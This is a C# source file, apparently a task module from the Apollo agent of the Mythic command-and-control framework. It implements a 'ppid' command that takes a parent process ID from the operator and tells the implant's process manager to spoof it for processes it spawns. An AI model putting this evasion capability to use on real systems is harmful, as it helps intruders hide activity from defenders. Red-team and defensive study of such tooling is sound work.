#define COMMAND_NAME_UPPER

#if DEBUG
#define PPID
#endif

#if PPID

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Diagnostics;
using System.Runtime.Serialization;

namespace Tasks
{
    public class ppid : Tasking
    {
        [DataContract]
        internal struct PpidParameters
        {
            [DataMember(Name = "ppid")]
            public int ParentProcessId;
        }
        public ppid(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        public override void Start()
        {
            MythicTaskResponse resp;
            PpidParameters parameters = _jsonSerializer.Deserialize<PpidParameters>(_data.Parameters);
            Process p = null;
            string errorMsg = "";
            try
            {
                p = Process.GetProcessById(parameters.ParentProcessId);
            }
            catch (Exception ex)
            {
                errorMsg = $"Failed to set PPID to {parameters.ParentProcessId}: {ex.Message}";
            }

            if (p != null)
            {
                if (_agent.GetProcessManager().SetPPID(parameters.ParentProcessId))
                {
                    resp = CreateTaskResponse($"Set PPID to {parameters.ParentProcessId}", true);
                }
                else
                {
                    resp = CreateTaskResponse("Failed to set PPID", true, "error");
                }
            }
            else
            {
                resp = CreateTaskResponse(errorMsg, true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}
#endif